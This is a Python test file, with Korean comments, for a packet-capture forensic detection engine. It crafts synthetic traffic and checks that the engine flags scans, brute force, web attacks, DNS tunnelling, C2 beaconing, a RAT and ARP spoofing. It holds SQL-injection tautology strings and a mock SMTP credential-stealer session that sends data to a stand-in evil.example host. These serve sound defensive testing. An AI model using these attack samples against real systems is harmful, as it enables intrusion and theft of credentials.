"""탐지 엔진 종단 테스트: 합성 시나리오 pcap -> analyze -> 기대한 탐지가 나오는가."""
import importlib.util
import os
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from pcapfor.analyzer import analyze
from pcapfor.pcapio import write_pcap

# tools/make_samples.py 를 모듈로 로드해 시나리오 생성 함수를 재사용한다
_spec = importlib.util.spec_from_file_location(
    "make_samples",
    os.path.join(os.path.dirname(__file__), "..", "tools", "make_samples.py"),
)
make_samples = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(make_samples)


def _analyze_scenario(maker, ioc_path=None):
    pkts = maker()
    f = tempfile.NamedTemporaryFile(delete=False, suffix=".pcap")
    f.close()
    write_pcap(f.name, pkts)
    try:
        return analyze(f.name, ioc_path=ioc_path)
    finally:
        os.unlink(f.name)


def _titles(result, category=None):
    return [f.title for f in result.findings if category is None or f.category == category]


class TestDetectors(unittest.TestCase):
    def test_portscan_and_hostsweep(self):
        r = _analyze_scenario(make_samples.make_portscan)
        self.assertTrue(any("포트 스캔" in t for t in _titles(r, "recon")))
        self.assertTrue(any("호스트 스윕" in t for t in _titles(r, "recon")))

    def test_ftp_bruteforce_and_credentials(self):
        r = _analyze_scenario(make_samples.make_ftp_bruteforce)
        self.assertTrue(any("FTP 브루트포스" in t for t in _titles(r, "bruteforce")))
        creds = _titles(r, "credential")
        self.assertEqual(len(creds), 1)  # 성공한 세션 1건만 보고해야 한다
        self.assertIn("FTP 평문 자격증명", creds[0])

    def test_web_attacks(self):
        r = _analyze_scenario(make_samples.make_web_attacks)
        titles = " / ".join(_titles(r, "webattack"))
        for name in ("SQL 인젝션", "XSS", "경로 조작", "Log4Shell", "Shellshock"):
            self.assertIn(name, titles)
        self.assertTrue(any("HTTP Basic" in t for t in _titles(r, "credential")))
        self.assertTrue(any("폼 비밀번호" in t for t in _titles(r, "credential")))
        self.assertTrue(any("브루트포스" in t for t in _titles(r, "bruteforce")))

    def test_dns_tunnel_and_dga(self):
        r = _analyze_scenario(make_samples.make_dns_tunnel)
        self.assertTrue(any("DNS 터널링" in t for t in _titles(r, "c2")))
        self.assertTrue(any("DGA" in t for t in _titles(r, "c2")))
        # 정상 도메인(naver 등)은 탐지에 등장하면 안 된다
        self.assertFalse(any("naver" in t for t in _titles(r)))

    # ---- QA 2차(Practical Packet Analysis 샘플)에서 추가된 규칙들 ----

    def _analyze_pkts(self, pkts):
        f = tempfile.NamedTemporaryFile(delete=False, suffix=".pcap")
        f.close()
        write_pcap(f.name, pkts)
        try:
            return analyze(f.name)
        finally:
            os.unlink(f.name)

    def test_sqli_tautology_variants(self):
        from pcapfor.detect import WEB_ATTACK_RULES
        sqli = WEB_ATTACK_RULES[0][3]
        for s in ("%' or '0'='0", "x' or 'a'='a", "' or 1=1", "' OR '1'='1"):
            self.assertIsNotNone(sqli.search(s), s)
        self.assertIsNone(sqli.search("' or '0'='1"))   # 다른 값 비교는 항진식 아님

    def test_telnet_cleartext_credentials(self):
        from pcapfor import craft
        pkts = []
        flow = craft.TcpFlow(pkts, "192.168.0.2", 1550, "192.168.0.1", 23)
        flow.handshake(1.0)
        flow.send(1.01, b"\xff\xfd\x18\xff\xfb\x01\r\nlogin: ", c2s=False)
        for i, ch in enumerate(b"fakx\x7fe\r\n"):       # 오타 후 백스페이스 수정
            flow.send(1.02 + i * 0.01, bytes([ch]))
        flow.send(1.2, b"Password:", c2s=False)
        flow.send(1.3, b"user\r\nls -a\r\n")
        flow.send(1.4, b"Last login: ...\r\n$ ", c2s=False)
        flow.close(1.5)
        r = self._analyze_pkts(pkts)
        creds = [x for x in r.findings if "Telnet" in x.title]
        self.assertEqual(len(creds), 1)
        ev = " ".join(creds[0].evidence)
        self.assertIn("사용자명: fake", ev)
        self.assertIn("ls -a", ev)
        self.assertNotIn("user", ev.replace("사용자명", ""))  # 비밀번호 원문 비노출

    def test_arp_one_mac_many_ips(self):
        from pcapfor import craft
        atk = "00:25:b3:bf:91:ee"
        pkts = [(1.0, craft.arp_reply(atk, "172.16.0.1", "00:21:70:c0:56:f0", "172.16.0.107")),
                (2.0, craft.arp_reply(atk, "172.16.0.105", "00:21:70:c0:56:f0", "172.16.0.107"))]
        r = self._analyze_pkts(pkts)
        self.assertTrue(any(atk in x.title for x in r.findings if x.category == "spoofing"))

    def test_http_post_hex_c2(self):
        from pcapfor import craft
        pkts = []
        for i in range(3):
            flow = craft.TcpFlow(pkts, "192.168.122.145", 49200 + i, "203.0.113.44", 80)
            ts = 10.0 + i * 30
            flow.handshake(ts)
            body = b"o=" + (b"6b7876386833" * 12)
            flow.send(ts + 0.01, b"POST /76N1Lm.php?n=r" + str(i).encode() +
                      b" HTTP/1.1\r\nHost: c2.example\r\nContent-Length: " +
                      str(len(body)).encode() + b"\r\n\r\n" + body)
            flow.send(ts + 0.02, b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nok", c2s=False)
            flow.close(ts + 0.03)
        r = self._analyze_pkts(pkts)
        self.assertTrue(any("HTTP POST C2" in x.title for x in r.findings))

    def test_rat_screen_capture_exfil(self):
        from pcapfor import craft
        pkts = []
        jpeg = b"\xff\xd8\xff\xe0\x00\x10JFIF" + bytes(range(256)) * 8
        for i in range(3):
            flow = craft.TcpFlow(pkts, "172.16.0.114", 6640 + i, "172.16.0.111", 4433)
            ts = 5.0 + i * 47.0
            flow.handshake(ts)
            flow.send(ts + 0.01, b"CAPSCREEN|C:\\x.dat|2058\n" + jpeg)
            flow.send(ts + 0.02, b"OK\r\n", c2s=False)
            flow.close(ts + 0.03)
        r = self._analyze_pkts(pkts)
        self.assertTrue(any("RAT" in x.title for x in r.findings))

    def test_smtp_cleartext_credentials(self):
        # Agent Tesla 류: SMTP AUTH LOGIN(base64) + 메일 유출 (QA 이미지 03 패턴)
        import base64 as b64
        from pcapfor import craft
        pkts = []
        flow = craft.TcpFlow(pkts, "192.168.1.27", 51958, "203.0.113.25", 587)
        flow.handshake(1.0)
        flow.send(1.01, b"220-mail.example ESMTP ready\r\n", c2s=False)
        user = b64.b64encode(b"stealer@example.in")
        pw = b64.b64encode(b"S3cret#1")
        flow.send(1.02, b"EHLO VICTIM-PC\r\nAUTH login " + user + b"\r\n" + pw +
                  b"\r\nMAIL FROM:<stealer@example.in>\r\nRCPT TO:<drop@evil.example>\r\n"
                  b"DATA\r\nSubject: PW_VICTIM-PC\r\n\r\nstolen...\r\n.\r\nQUIT\r\n")
        flow.send(1.03, b"235 ok\r\n", c2s=False)
        flow.close(1.1)
        f = tempfile.NamedTemporaryFile(delete=False, suffix=".pcap")
        f.close()
        write_pcap(f.name, pkts)
        try:
            r = analyze(f.name)
        finally:
            os.unlink(f.name)
        creds = [x for x in r.findings if x.category == "credential"]
        self.assertEqual(len(creds), 1)
        self.assertIn("SMTP", creds[0].title)
        ev = " ".join(creds[0].evidence)
        self.assertIn("stealer@example.in", ev)
        self.assertIn("drop@evil.example", ev)
        self.assertNotIn("S3cret", ev)  # 비밀번호 원문은 노출 금지

    def test_dns_tunneling_iodine_pattern(self):
        # 실측(QA 이미지 04) 기반: 반복 폴링이라 고유율·엔트로피는 낮지만
        # 평균 길이가 극단적이고 qtype 이 NULL 인 iodine 패턴
        from pcapfor import craft
        pkts = []
        # DNS 라벨은 63바이트 제한 → 50자 라벨 2개로 긴 서브도메인 구성 (저엔트로피 반복)
        label = "aacaaaaadb" * 5
        for i in range(25):
            name = f"{label}.{label}.io2.tunnel-test.de"
            craft.udp_packet(pkts, 1000.0 + i, "10.0.0.9", "10.0.0.53",
                             43000 + (i % 3), 53,
                             craft.dns_query(name, qtype=10, txid=0x5000 + i))
        f = tempfile.NamedTemporaryFile(delete=False, suffix=".pcap")
        f.close()
        write_pcap(f.name, pkts)
        try:
            r = analyze(f.name)
        finally:
            os.unlink(f.name)
        titles = _titles(r, "c2")
        self.assertTrue(any("DNS 터널링" in t for t in titles))
        # 하위 존이 보고되고 상위 존 중복 보고는 없어야 한다
        self.assertFalse(any(t.endswith("tunnel-test.de") and "io2" not in t for t in titles))

    def test_beaconing(self):
        r = _analyze_scenario(make_samples.make_beacon)
        self.assertTrue(any("비커닝" in t for t in _titles(r, "c2")))

    def test_arp_spoofing(self):
        r = _analyze_scenario(make_samples.make_arpspoof)
        self.assertTrue(any("ARP 스푸핑" in t for t in _titles(r, "spoofing")))

    def test_ioc_match(self):
        ioc = tempfile.NamedTemporaryFile(delete=False, suffix=".txt", mode="w",
                                          encoding="utf-8")
        ioc.write("# 테스트 IOC\n203.0.113.99\nexample-c2.net\n")
        ioc.close()
        try:
            r = _analyze_scenario(make_samples.make_mixed, ioc_path=ioc.name)
        finally:
            os.unlink(ioc.name)
        ioc_titles = _titles(r, "ioc")
        self.assertTrue(any("203.0.113.99" in t for t in ioc_titles))
        self.assertTrue(any("example-c2.net" in t for t in ioc_titles))

    def test_mixed_has_no_false_category_explosion(self):
        r = _analyze_scenario(make_samples.make_mixed)
        cats = {f.category for f in r.findings}
        self.assertEqual(
            cats, {"recon", "bruteforce", "webattack", "credential", "c2", "spoofing"}
        )
        self.assertEqual(r.max_severity, "critical")


if __name__ == "__main__":
    unittest.main()
